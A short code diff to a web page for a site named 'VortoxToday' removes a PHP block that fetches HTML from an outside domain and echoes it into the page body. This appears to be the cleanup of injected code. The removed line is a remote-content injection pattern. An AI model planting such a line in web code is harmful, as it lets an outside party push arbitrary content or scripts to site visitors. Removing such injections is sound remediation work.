@@ -442,10 +442,6 @@
 </head>
 <body>
 
-    <?php
-echo file_get_contents('https://lumavahome.site/desktop.html');
-?>
-    
     <nav class="vx7nav-container">
         <div class="vx7nav-wrapper">
             <a href="#home" class="vx7logo-text">VortoxToday</a>
@@ -1013,6 +1009,7 @@ echo file_get_contents('https://lumavahome.site/desktop.html');
     </script>
 </body>
 </html>
+
 
 
 
